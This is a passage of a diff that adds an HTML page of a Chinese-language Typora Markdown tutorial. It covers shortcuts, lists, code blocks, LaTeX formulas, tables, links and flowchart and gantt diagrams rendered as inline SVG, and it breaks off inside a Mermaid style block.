+<p>撤销： Ctrl + Z			返回Typora顶部：Ctrl+Home     返回Typora底部：Ctrl+End    </p>
+<p>公式块：Ctrl+Shift+I  		     引用：Ctrl+Shift+Q          </p>
+<p>标题： Ctrl + 1（一级标题）；Ctrl + 2（二级标题） – 以此类推</p>
+<h2 id="引用文字"><a href="#引用文字" class="headerlink" title="引用文字"></a>引用文字</h2><p>Markdown 使用电子邮件样式&gt;字符进行块引用。它们表示为：</p>
+<pre class="language-none"><code class="language-none">&gt; 这是一个有两段的块引用。这是第一段。
+&gt;
+&gt; 这是第二段。Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.
+
+
+
+&gt; 这是另一个只有一个段落的块引用。有三个空行分隔两个块引用。</code></pre>
+
+<p>在typora中，只需输入’&gt;’后跟引用内容即可生成块引用。Typora将为您插入正确的“&gt;”或换行符。通过添加额外级别的“&gt;”允许在块引用内嵌入另一个块引用。</p>
+<h2 id="元素列表"><a href="#元素列表" class="headerlink" title="元素列表"></a>元素列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>使用 *   +   -  都可以创建一个无序列表</p>
+<pre class="language-none"><code class="language-none">* AAA
++ BBB
+- CCC</code></pre>
+
+<h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>使用 1. 2. 3. 创建有序列表</p>
+<pre class="language-none"><code class="language-none">1. AAA
+2. BBB
+3. CCC</code></pre>
+
+<h3 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h3><p>任务列表是标记为[ ]或[x]（未完成或完成）的项目的列表。例如：</p>
+<pre class="language-none"><code class="language-none">- [ ] 这是一个任务列表项
+- [ ] 需要在前面使用列表的语法
+- [ ] normal **formatting**, @mentions, #1234 refs
+- [ ] 未完成
+- [x] 完成</code></pre>
+
+<p>您可以通过单击项目前面的复选框来更改完成&#x2F;未完成状态。</p>
+<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>在Typora中插入程序代码的方式有两种：使用反引号 &#96;（~ 键）、使用缩进（Tab）。</p>
+<ul>
+<li><p>插入行内代码，即插入一个单词或者一句代码的情况，使用 <code>code</code> 这样的形式插入。</p>
+</li>
+<li><p>插入多行代码输入3个反引号（&#96;） + 回车，并在后面选择一个语言名称即可实现语法高亮。</p>
+</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hell oword"</span><span class="token punctuation">)</span></code></pre>
+
+<h2 id="数学公式块"><a href="#数学公式块" class="headerlink" title="数学公式块"></a>数学公式块</h2><p>您可以使用 MathJax 渲染 LaTeX 数学表达式。</p>
+<p>输入 $$, 然后按“return”键将触发一个接受Tex &#x2F; LaTex源代码的输入区域。以下是一个例子： </p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/33ed0e61febfaa79.png" loading="lazy"></p>
+<p>在 markdown 源文件中，数学公式块是由’$$’标记包装的 LaTeX 表达式：</p>
+<pre class="language-none"><code class="language-none">$$
+\mathbf&#123;V&#125;_1 \times \mathbf&#123;V&#125;_2 &#x3D;  \begin&#123;vmatrix&#125; 
+\mathbf&#123;i&#125; &amp; \mathbf&#123;j&#125; &amp; \mathbf&#123;k&#125; \\
+\frac&#123;\partial X&#125;&#123;\partial u&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial u&#125; &amp; 0 \\
+\frac&#123;\partial X&#125;&#123;\partial v&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial v&#125; &amp; 0 \\
+\end&#123;vmatrix&#125;
+$$</code></pre>
+
+<p>LeTeX表达式参考连接：<a href="https://blog.csdn.net/ViatorSun/article/details/82826664#:~:text=%E7%9A%84LaTex%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%BA%20%24x_i%5E2%24%20%E3%80%82.%20LaTex%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%A0%87%E5%8F%AF%E4%BB%A5%E5%8F%A0%E5%8A%A0%E7%9A%84%EF%BC%8C%E5%B0%B1%E6%AF%94%E5%A6%82.%20x%20%20y%20,x_%20%7B2i%7D%5E%20%7B2%2Bb%7D.%20x2i2%2Bb.%20%E2%80%8B.%20%E7%9A%84LaTex%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%BA%24x_%20%7B2i%7D%5E%20%7B2%2Bb%7D%24%E3%80%82.">超详细 LaTex数学公式</a>   <a href="https://blog.csdn.net/weixin_39679367/article/details/84729452">LaTeX：公式常用字符和表达式</a></p>
+<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>输入 <code>| First Header | Second Header |</code> 并按下 <code>return</code> 键将创建一个包含两列的表。</p>
+<p>创建表后，焦点在该表上将弹出一个表格工具栏，您可以在其中调整表格，对齐或删除表格。您还可以使用上下文菜单来复制和添加&#x2F;删除列&#x2F;行。</p>
+<p>可以跳过以下描述，因为表格的 markdown 源代码是由typora自动生成的。</p>
+<p>在 markdown 源代码中，它们看起来像这样：</p>
+<pre class="language-none"><code class="language-none">| First Header  | Second Header |
+| ------------- | ------------- |
+| Content Cell  | Content Cell  |
+| Content Cell  | Content Cell  |</code></pre>
+
+<p>您还可以在表格中包括内联 Markdown 语法，例如链接，粗体，斜体或删除线。</p>
+<ul>
+<li>不管是哪种方式，第一行为表头，第二行为分割表头和主体部分，第三行开始每一行为一个表格行</li>
+<li>列与列之间用管道符号<code>|</code> 隔开</li>
+<li>还可设置对齐方式(表头与内容之间)，如果不使用对齐标记，内容默认左对齐，表头居中对齐<ul>
+<li>左对齐 ：|</li>
+<li>右对齐 |：</li>
+<li>中对齐 ：|：</li>
+</ul>
+</li>
+<li>为了美观，可以使用空格对齐不同行的单元格，并在左右两侧都使用 | 来标记单元格边界</li>
+<li>为了使 Markdown 更清晰，| 和 - 两侧需要至少有一个空格（最左侧和最右侧的 | 外就不需要了）</li>
+</ul>
+<h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><pre class="language-none"><code class="language-none">您可以像这样创建脚注[^footnote].
+
+[^footnote]: Here is the *text* of the **footnote**.</code></pre>
+
+<p>将产生：</p>
+<p>您可以像这样创建脚注<a href="https://support.typoraio.cn/zh/Markdown-Reference/#fn:footnote">1</a>.</p>
+<p>鼠标移动到‘footnote’上标中查看脚注的内容。</p>
+<h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><p>输入 <code>***</code> 或 <code>---</code> 在空行上按 <code>return</code> 键将绘制一条水平线。</p>
+<h2 id="目录-TOC"><a href="#目录-TOC" class="headerlink" title="目录 (TOC)"></a>目录 (TOC)</h2><p>输入 <code>[toc]</code> 然后按 <code>Return</code> 键将创建一个“目录”部分，自动从文档内容中提取所有标题，其内容会自动更新。</p>
+<h2 id="上下标"><a href="#上下标" class="headerlink" title="上下标"></a>上下标</h2><h3 id="上标"><a href="#上标" class="headerlink" title="上标"></a>上标</h3><p>可以使用<code>&lt;sup&gt;文本&lt;/sup&gt;</code>实现上标。</p>
+<p>(需在设置中打开该功能)</p>
+<p>X<sup>2</sup></p>
+<h3 id="下标"><a href="#下标" class="headerlink" title="下标"></a>下标</h3><p>可以使用 <code>&lt;sub&gt;文本&lt;/sub&gt;</code>实现下标。</p>
+<p>(需在设置中打开该功能)</p>
+<p>H<sub>2</sub>O</p>
+<h2 id="文本居中"><a href="#文本居中" class="headerlink" title="文本居中"></a>文本居中</h2><p>使用 <code>&lt;center&gt;这是要居中的内容&lt;/center&gt;</code>可以使文本居中</p>
+<center>这是要居中的文本内容</center>
+
+
+
+<h2 id="Span-元素"><a href="#Span-元素" class="headerlink" title="Span 元素"></a>Span 元素</h2><p>在您输入后Span元素会被立即解析并呈现。在这些span元素上移动光标会将这些元素扩展为markdown源代码。以下将解释这些span元素的语法。</p>
+<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>Markdown 支持两种类型的链接：内联和引用。</p>
+<p>在这两种样式中，链接文本都写在[方括号]内。</p>
+<p>要创建内联链接，请在链接文本的结束方括号后立即使用一组常规括号。在常规括号内，输入URL地址，以及可选的用引号括起来的链接标题。例如：</p>
+<pre class="language-none"><code class="language-none">This is [an example](http:&#x2F;&#x2F;example.com&#x2F; &quot;Title&quot;) inline link.
+
+[This link](http:&#x2F;&#x2F;example.net&#x2F;) has no title attribute.</code></pre>
+
+<p>将产生：</p>
+<p>This is <a href="http://example.com/%22Title%22">an example</a> inline link. (<code>&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;</code>)</p>
+<p><a href="http://example.net/">This link</a> has no title attribute. (<code>&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has no</code>)</p>
+<h4 id="内部链接"><a href="#内部链接" class="headerlink" title="内部链接"></a>内部链接</h4><p><strong>您可以将常规括号内的 href 设置为文档内的某一个标题</strong>，这将创建一个书签，允许您在单击后跳转到该部分。例如：</p>
+<p>Command(在Windows上：Ctrl) + 单击 <a href="https://support.typoraio.cn/zh/Markdown-Reference/#%E5%9D%97%E5%85%83%E7%B4%A0">此链接</a> 将跳转到标题 <code>块元素</code>处。 要查看如何编写，请移动光标或按住 <code>⌘</code> 键单击以将元素展开为 Markdown 源代码。</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>参考样式链接使用第二组方括号，在其中放置您选择的标签以标识链接：</p>
+<pre class="language-none"><code class="language-none">This is [an example][id] reference-style link.
+
+然后，在文档中的任何位置，您可以单独定义链接标签，如下所示：
+
+[id]: http:&#x2F;&#x2F;example.com&#x2F;  &quot;Optional Title Here&quot;</code></pre>
+
+<p>在typora中，它们将呈现为：</p>
+<p>This is <a href="http://example.com/">an example</a> reference-style link.</p>
+<p>隐式链接名称快捷方式允许您省略链接的名称，在这种情况下，链接文本本身将用作名称。只需使用一组空的方括号，例如，将“Google”一词链接到google.com网站，您只需写下：</p>
+<pre class="language-none"><code class="language-none">[Google][]
+然后定义链接：
+
+[Google]: http:&#x2F;&#x2F;google.com&#x2F;</code></pre>
+
+<p>在typora中单击链接将其展开以进行编辑，command + 单击将在 Web 浏览器中打开超链接。</p>
+<h3 id="URL网址"><a href="#URL网址" class="headerlink" title="URL网址"></a>URL网址</h3><p>Typora允许您将 URL 作为链接插入，用 <code>&lt;</code>括号括起来<code>&gt;</code>。</p>
+<p><code>&lt;i@typora.io&gt;</code> 成为 <a href="mailto:i@typora.io">i@typora.io</a>.</p>
+<p>Typora也将自动链接标准URL。例如： <a href="http://www.google.com/">www.google.com</a>.</p>
+<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p>图像与链接类似， 但在链接语法之前需要添加额外的 <code>!</code> 字符。 图像语法如下所示：</p>
+<pre class="language-none"><code class="language-none">![替代文字](&#x2F;path&#x2F;to&#x2F;img.jpg)
+
+![替代文字](&#x2F;path&#x2F;to&#x2F;img.jpg &quot;可选标题&quot;)</code></pre>
+
+<p>您可以使用拖放操作从图像文件或浏览器来插入图像。并通过单击图像修改 markdown 源代码。如果图像在拖放时与当前编辑文档位于同一目录或子目录中，则将使用相对路径。</p>
+<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>教程来自知乎：<a href="https://zhuanlan.zhihu.com/p/40810821">https://zhuanlan.zhihu.com/p/40810821</a></p>
+<p>Typora可以直接在markdown中画流程图，而且语法简洁易懂</p>
+<ul>
+<li>sequence</li>
+</ul>
+<p>语言选择sequence即可生成流程图</p>
+<pre class="language-none"><code class="language-none">李雷 -&gt; 韩梅梅: Hello 梅梅, How are you?
+Note right of 韩梅梅: 韩梅梅心想
+韩梅梅 --&gt; 李雷: I&#39;m fine, thanks, and you?</code></pre>
+
+<svg width="460.78125" height="247.416" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative; left: -0.0336056px; top: -0.972681px; max-width: 100%; height: auto;" version="1.1">
+ <desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Created with Raphaël 2.2.0</desc>
+ <defs style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
+  <path style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" id="raphael-marker-block" d="m5,0l-5,2.5l5,2.5l0,-5z" stroke-linecap="round"/>
+  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="2.5" refX="2.5" orient="auto" markerWidth="5" markerHeight="5" id="raphael-marker-endblock55-objehh4q">
+   <use id="svg_1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" transform="rotate(180 2.5,2.5) scale(1) " xlink:href="#raphael-marker-block"/>
+  </marker>
+  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="2.5" refX="2.5" orient="auto" markerWidth="5" markerHeight="5" id="raphael-marker-endblock55-objo2myt">
+   <use id="svg_2" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" transform="rotate(180 2.5,2.5) scale(1) " xlink:href="#raphael-marker-block"/>
+  </marker>
+ </defs>
+ <g>
+  <title>background</title>
+  <rect fill="none" id="canvas_background" height="619" width="1292" y="-1" x="-1"/>
+ </g>
+ <g>
+  <title>Layer 1</title>
+  <rect id="svg_3" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="52.28125" y="20" x="10"/>
+  <rect id="svg_4" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="32.28125" y="30" x="20"/>
+  <text id="svg_5" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="37.742188" x="36.140625">
+   <tspan id="svg_6" dy="5.71875">李雷</tspan>
+  </text>
+  <rect id="svg_7" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="52.28125" y="191.9375" x="10"/>
+  <rect id="svg_8" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="32.28125" y="201.9375" x="20"/>
+  <text id="svg_9" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="209.679688" x="36.140625">
+   <tspan id="svg_10" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">李雷</tspan>
+  </text>
+  <path id="svg_11" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" stroke-width="2" d="m36.14063,55.48438l0,136.45312" stroke="currentColor" fill="var(--bg-color)"/>
+  <rect id="svg_12" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="68.40625" y="20" x="231.6875"/>
+  <rect id="svg_13" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="48.40625" y="30" x="241.6875"/>
+  <text id="svg_14" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="37.742188" x="265.890625">
+   <tspan id="svg_15" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">韩梅梅</tspan>
+  </text>
+  <rect id="svg_16" stroke-width="2" stroke="currentColor" fill="none" height="35.484375" width="68.40625" y="191.9375" x="231.6875"/>
+  <rect id="svg_17" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="48.40625" y="201.9375" x="241.6875"/>
+  <text id="svg_18" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="209.679688" x="265.890625">
+   <tspan id="svg_19" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">韩梅梅</tspan>
+  </text>
+  <path id="svg_20" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" stroke-width="2" d="m265.89063,55.48438l0,136.45312" stroke="currentColor" fill="var(--bg-color)"/>
+  <rect id="svg_21" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="193.625" y="72.734375" x="54.203125"/>
+  <text id="svg_22" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="80.484375" x="151.015625">
+   <tspan id="svg_23" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.710938">Hello 梅梅, How are you?</tspan>
+  </text>
+  <path id="svg_24" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock55-objehh4q)" stroke-width="2" d="m36.14063,90.96875c0,0 191.19018,0 224.75115,0" stroke="currentColor" fill="var(--bg-color)"/>
+  <rect id="svg_25" stroke-width="2" stroke="currentColor" fill="none" height="25.484375" width="90.6875" y="110.96875" x="285.890625"/>
+  <rect id="svg_26" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="80.6875" y="115.96875" x="290.890625"/>
+  <text id="svg_27" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="123.710938" x="331.234375">
+   <tspan id="svg_28" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.71875">韩梅梅心想</tspan>
+  </text>
+  <rect id="svg_29" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="none" height="15.484375" width="209.75" y="153.703125" x="46.140625"/>
+  <text id="svg_30" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-family: "Andale Mono", monospace; font-size: 16px;" fill="currentColor" font-size="16px" font-family="Andale Mono, monospace" text-anchor="middle" y="161.453125" x="151.015625">
+   <tspan id="svg_31" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="5.710938">I'm fine, thanks, and you?</tspan>
+  </text>
+  <path id="svg_32" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" stroke-dasharray="6,2" marker-end="url(#raphael-marker-endblock55-objo2myt)" stroke-width="2" d="m265.89063,171.9375c0,0 -191.19019,0 -224.75116,0" stroke="currentColor" fill="var(--bg-color)"/>
+ </g>
+</svg>
+
+
+<ul>
+<li>flowchart</li>
+</ul>
+<p>对于Flowchart,语法选择flow</p>
+<pre class="language-none"><code class="language-none">st&#x3D;&gt;start: 闹钟响起
+op&#x3D;&gt;operation: 与床板分离
+cond&#x3D;&gt;condition: 分离成功?
+e&#x3D;&gt;end: 快乐的一天
+
+st-&gt;op-&gt;cond
+cond(yes)-&gt;e
+cond(no)-&gt;op</code></pre>
+
+
+<svg width="175.8203125" height="408.509765625" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid meet" style="overflow: hidden; position: relative; left: -0.0378136px; top: -0.976878px;" version="1.1">
+ <desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Created with Raphaël 2.2.0</desc>
+ <defs style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
+  <path style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" id="raphael-marker-block" d="m5,0l-5,2.5l5,2.5l0,-5z" stroke-linecap="round"/>
+  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-objrngqv">
+   <use id="svg_1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
+  </marker>
+  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-objfsd5j">
+   <use id="svg_2" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
+  </marker>
+  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-obj05jvn">
+   <use id="svg_3" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
+  </marker>
+  <marker style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" refY="1.5" refX="1.5" orient="auto" markerWidth="3" markerHeight="3" id="raphael-marker-endblock33-objyoquh">
+   <use id="svg_4" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" fill="currentColor" stroke-width="1.6667" transform="rotate(180 1.5,1.5) scale(0.6000000238418579) " xlink:href="#raphael-marker-block"/>
+  </marker>
+ </defs>
+ <g>
+  <title>background</title>
+  <rect fill="none" id="canvas_background" height="618" width="517" y="-1" x="-1"/>
+ </g>
+ <g>
+  <title>Layer 1</title>
+  <rect transform="matrix(1,0,0,1,38.668,23.377) " id="st" class="flowchart" stroke-width="3" stroke="currentColor" fill="none" ry="20" rx="20" height="36.15625" width="76.484375" y="0" x="0"/>
+  <text transform="matrix(1,0,0,1,38.668,23.377) " class="flowchartt" id="stt" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="18.078125" x="10">
+   <tspan id="svg_5" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">闹钟响起</tspan>
+  </text>
+  <rect transform="matrix(1,0,0,1,31.6133,132.9102) " id="op" class="flowchart" stroke-width="3" stroke="currentColor" fill="none" height="36.15625" width="90.59375" y="0" x="0"/>
+  <text transform="matrix(1,0,0,1,31.6133,132.9102) " class="flowchartt" id="opt" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="18.078125" x="10">
+   <tspan id="svg_6" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">与床板分离</tspan>
+  </text>
+  <path class="flowchart" id="cond" stroke-width="3" d="m41.45508,242.79394l-35.45508,17.72754l70.91016,35.45508l70.91015,-35.45508l-70.91015,-35.45508l-70.91016,35.45508" stroke="currentColor" fill="none"/>
+  <text transform="matrix(1,0,0,1,6,225.0664) " class="flowchartt" id="condt" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="35.455078" x="40.455078">
+   <tspan id="svg_7" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.705078">分离成功?</tspan>
+  </text>
+  <rect transform="matrix(1,0,0,1,31.6133,369.3535) " id="e" class="flowchart" stroke-width="3" stroke="currentColor" fill="none" ry="20" rx="20" height="36.15625" width="90.59375" y="0" x="0"/>
+  <text transform="matrix(1,0,0,1,31.6133,369.3535) " class="flowchartt" id="et" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="18.078125" x="10">
+   <tspan id="svg_8" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">快乐的一天</tspan>
+  </text>
+  <path id="svg_9" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock33-objrngqv)" stroke-width="3" d="m76.91016,59.5332c0,0 0,52.90527 0,68.86985" stroke="currentColor" fill="none"/>
+  <path id="svg_10" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock33-objfsd5j)" stroke-width="3" d="m76.91016,169.06641c0,0 0,38.20077 0,51.50016" stroke="currentColor" fill="none"/>
+  <path id="svg_11" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" marker-end="url(#raphael-marker-endblock33-obj05jvn)" stroke-width="3" d="m76.91016,295.97656c0,0 0,52.90527 0,68.86985" stroke="currentColor" fill="none"/>
+  <text id="svg_12" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="305.976563" x="81.910156">
+   <tspan id="svg_13" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.703125">yes</tspan>
+  </text>
+  <path id="svg_14" marker-end="url(#raphael-marker-endblock33-objyoquh)" stroke-width="3" d="m147.82031,260.52148c0,0 25,-10 25,-10c0,0 0,-152.61132 0,-152.61132c0,0 -95.91015,0 -95.91015,0c0,0 0,21.04307 0,30.49601" stroke="currentColor" fill="none"/>
+  <text id="svg_15" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: start; font-family: Arial; font-size: 14px;" fill="currentColor" font-size="14px" font-family=""Arial"" text-anchor="start" y="250.521484" x="152.820313">
+   <tspan id="svg_16" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);" dy="4.708984">no</tspan>
+  </text>
+ </g>
+</svg>
+
+
+
+
+<ul>
+<li>gantt</li>
+</ul>
+<p>除了Sequence和Flowchart两类图之外，Mermaid还提供一种叫做gantt的图。插入下面的代码，然后语法选mermaid就会自动渲染成gantt图了。</p>
+<pre class="language-none"><code class="language-none">gantt
+        dateFormat  YYYY-MM-DD
+        title 快乐的生活
+        section 吃一把鸡就学习
+        学习            :done,    des1, 2014-01-06,2014-01-09
+        疯狂学习               :active,  des2, 2014-01-09, 3d
+        继续疯狂学习               :         des3, after des2, 5d
+        吃鸡！               :         des4, after des3, 4d
+        section 具体内容
+        学习Python :crit, done, 2014-01-06,72h
+        学习C++          :crit, done, after des1, 2d
+        学习Lisp             :crit, active, 3d
+        学习图形学        :crit, 4d
+        跳伞           :2d
+        打枪                      :2d
+</code></pre>
+
+<p><svg id="mermaidChart0" width="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 624 340" height="340" style="max-width: 624px;"><style>#mermaidChart0{font-family:sans-serif;font-size:16px;fill:#333;}#mermaidChart0 .error-icon{fill:#552222;}#mermaidChart0 .error-text{fill:#552222;stroke:#552222;}#mermaidChart0 .edge-thickness-normal{stroke-width:2px;}#mermaidChart0 .edge-thickness-thick{stroke-width:3.5px;}#mermaidChart0 .edge-pattern-solid{stroke-dasharray:0;}#mermaidChart0 .edge-pattern-dashed{stroke-dasharray:3;}#mermaidChart0 .edge-pattern-dotted{stroke-dasharray:2;}#mermaidChart0 .marker{fill:#333333;}#mermaidChart0 .marker.cross{stroke:#333333;}#mermaidChart0 svg{font-family:sans-serif;font-size:16px;}#mermaidChart0 .mermaid-main-font{font-family:”trebuchet ms”,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .section{stroke:none;opacity:0.2;}#mermaidChart0 .section0{fill:rgba(102,102,255,0.49);}#mermaidChart0 .section2{fill:#fff400;}#mermaidChart0 .section1,#mermaidChart0 .section3{fill:white;opacity:0.2;}#mermaidChart0 .sectionTitle0{fill:#333;}#mermaidChart0 .sectionTitle1{fill:#333;}#mermaidChart0 .sectionTitle2{fill:#333;}#mermaidChart0 .sectionTitle3{fill:#333;}#mermaidChart0 .sectionTitle{text-anchor:start;font-size:11px;text-height:14px;font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .grid .tick{stroke:lightgrey;opacity:0.8;shape-rendering:crispEdges;}#mermaidChart0 .grid .tick text{font-family:sans-serif;fill:#333;}#mermaidChart0 .grid path{stroke-width:0;}#mermaidChart0 .today{fill:none;stroke:red;stroke-width:2px;}#mermaidChart0 .task{stroke-width:2;}#mermaidChart0 .taskText{text-anchor:middle;font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .taskText:not([font-size]){font-size:11px;}#mermaidChart0 .taskTextOutsideRight{fill:black;text-anchor:start;font-size:11px;font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .taskTextOutsideLeft{fill:black;text-anchor:end;font-size:11px;}#mermaidChart0 .task.clickable{cursor:pointer;}#mermaidChart0 .taskText.clickable{cursor:pointer;fill:#003163 !important;font-weight:bold;}#mermaidChart0 .taskTextOutsideLeft.clickable{cursor:pointer;fill:#003163 !important;font-weight:bold;}#mermaidChart0 .taskTextOutsideRight.clickable{cursor:pointer;fill:#003163 !important;font-weight:bold;}#mermaidChart0 .taskText0,#mermaidChart0 .taskText1,#mermaidChart0 .taskText2,#mermaidChart0 .taskText3{fill:white;}#mermaidChart0 .task0,#mermaidChart0 .task1,#mermaidChart0 .task2,#mermaidChart0 .task3{fill:#8a90dd;stroke:#534fbc;}#mermaidChart0 .taskTextOutside0,#mermaidChart0 .taskTextOutside2{fill:black;}#mermaidChart0 .taskTextOutside1,#mermaidChart0 .taskTextOutside3{fill:black;}#mermaidChart0 .active0,#mermaidChart0 .active1,#mermaidChart0 